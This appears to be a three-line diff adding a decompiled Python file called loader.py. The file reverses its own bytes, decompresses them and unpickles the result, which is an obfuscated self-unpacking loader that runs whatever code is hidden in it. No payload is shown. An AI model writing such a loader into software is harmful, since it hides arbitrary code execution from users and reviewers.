@@ -1,0 +1,3 @@
+# Embedded file name: loader.py
+import sys, zlib, pickle
+pickle.loads(zlib.decompress(open(sys.argv[0], 'rb').read()[::-1], -15))
